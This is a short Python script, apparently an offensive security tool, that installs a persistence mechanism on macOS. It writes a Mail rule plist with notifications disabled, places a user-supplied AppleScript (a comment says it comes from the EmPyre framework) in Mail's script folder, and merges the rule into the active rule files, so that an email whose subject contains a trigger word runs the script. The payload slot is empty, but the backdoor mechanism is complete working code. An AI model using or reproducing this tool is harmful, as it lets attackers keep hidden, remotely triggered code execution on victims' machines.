import os
from random import choice
from string import ascii_uppercase
__author__ = 'Esteban Rodriguez (n00py)'

#Enter a string that you would like the rule to be named
ruleName = "Test"
#Enter the 'trigger' word; This will need to be present in the subject line to execute the payload
trigger = "n00py"

#Paste the applescript here
#NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!
applescript =  '''
'''
#Gets the users current home dirctory
home =  os.getenv("HOME")
#Creates random filenames
random1 = "/tmp/" + (''.join(choice(ascii_uppercase) for i in range(12)))
random2 = "/tmp/" + (''.join(choice(ascii_uppercase) for i in range(12)))
random3 =  (''.join(choice(ascii_uppercase) for i in range(12))) + ".scpt"
#Skeleton for rule plist
plist = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
<dict>
		<key>AllCriteriaMustBeSatisfied</key>
		<string>NO</string>
		<key>AppleScript</key>
		<string>''' + random3 + '''</string>
		<key>AutoResponseType</key>
		<integer>0</integer>
		<key>Criteria</key>
		<array>
			<dict>
				<key>CriterionUniqueId</key>
				<string>254DAA16-F3D3-4255-A130-33AA94DC6686</string>
				<key>Expression</key>
				<string>''' + trigger + '''</string>
				<key>Header</key>
				<string>Subject</string>
			</dict>
		</array>
		<key>Deletes</key>
		<string>NO</string>
		<key>HighlightTextUsingColor</key>
		<string>NO</string>
		<key>MarkFlagged</key>
		<string>NO</string>
		<key>MarkRead</key>
		<string>NO</string>
		<key>NotifyUser</key>
		<string>NO</string>
		<key>RuleId</key>
		<string>9C8F5247-7894-46B4-A081-37AAB2500086</string>
		<key>ruleName</key>
		<string>''' + ruleName + '''</string>
		<key>SendNotification</key>
		<string>NO</string>
		<key>ShouldCopyMessage</key>
		<string>NO</string>
		<key>ShouldTransferMessage</key>
		<string>NO</string>
		<key>TimeStamp</key>
		<integer>466421321</integer>
		<key>Version</key>
		<integer>1</integer>
	</dict>
</array>
</plist>'''
#skeleton for activation plist
plist2 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>9C8F5247-7894-46B4-A081-37AAB2500086</key>
	<true/>
</dict>
</plist>
	'''

script = home + "/Library/Application Scripts/com.apple.mail/" + random3

os.system("touch " + random1)
with open(random1, 'w+') as f:
    f.write(plist)
    f.close()

os.system("touch " + random2)
with open(random2, 'w+') as f:
    f.write(plist2)
    f.close()

with open(script, 'w+') as f:
    f.write(applescript)
    f.close()

os.system("/usr/libexec/PlistBuddy -c 'Merge " + random1 + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
os.system("/usr/libexec/PlistBuddy -c 'Merge " + random2 + "' "+ home + "/Library/Mail/V3/MailData/RulesActiveState.plist")
os.system("rm " + random1)
os.system("rm " + random2)